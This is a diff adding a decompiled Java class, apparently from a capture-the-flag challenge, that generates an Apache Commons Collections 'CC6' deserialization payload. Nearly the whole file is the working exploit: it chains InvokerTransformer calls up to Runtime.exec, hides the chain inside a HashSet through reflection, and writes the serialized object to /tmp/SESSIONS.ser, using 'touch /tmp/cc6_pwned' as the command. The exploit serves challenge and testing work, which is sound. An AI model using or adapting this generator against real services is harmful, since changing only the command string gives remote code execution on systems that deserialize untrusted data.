@@ -1,0 +1,77 @@
+// Source code is decompiled from a .class file using FernFlower decompiler (from Intellij IDEA).
+package com.ctf.challenge;
+
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+public class CC6Generator {
+   public CC6Generator() {
+   }
+
+   public static void main(String[] var0) throws Exception {
+      String var1 = "touch /tmp/cc6_pwned";
+      Transformer[] var2 = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{var1})};
+      ChainedTransformer var3 = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
+      HashMap var4 = new HashMap();
+      Map var5 = LazyMap.decorate(var4, var3);
+      TiedMapEntry var6 = new TiedMapEntry(var5, "foo");
+      HashSet var7 = new HashSet(1);
+      var7.add("foo");
+      Field var8 = HashSet.class.getDeclaredField("map");
+      var8.setAccessible(true);
+      HashMap var9 = (HashMap)var8.get(var7);
+      Field var10 = HashMap.class.getDeclaredField("table");
+      var10.setAccessible(true);
+      Object[] var11 = (Object[])var10.get(var9);
+      Object var12 = null;
+      Object[] var13 = var11;
+      int var14 = var11.length;
+
+      for(int var15 = 0; var15 < var14; ++var15) {
+         Object var16 = var13[var15];
+         if (var16 != null) {
+            var12 = var16;
+            break;
+         }
+      }
+
+      if (var12 == null) {
+         throw new IllegalStateException("Could not find Node in HashMap");
+      } else {
+         Field var20 = var12.getClass().getDeclaredField("key");
+         var20.setAccessible(true);
+         var20.set(var12, var6);
+         var5.remove("foo");
+         Field var21 = ChainedTransformer.class.getDeclaredField("iTransformers");
+         var21.setAccessible(true);
+         var21.set(var3, var2);
+         System.out.println("[*] Writing CC6 payload to /tmp/SESSIONS.ser...");
+         ObjectOutputStream var22 = new ObjectOutputStream(new FileOutputStream("/tmp/SESSIONS.ser"));
+
+         try {
+            var22.writeObject(var7);
+         } catch (Throwable var19) {
+            try {
+               var22.close();
+            } catch (Throwable var18) {
+               var19.addSuppressed(var18);
+            }
+
+            throw var19;
+         }
+
+         var22.close();
+         System.out.println("[+] Success!");
+      }
+   }
+}
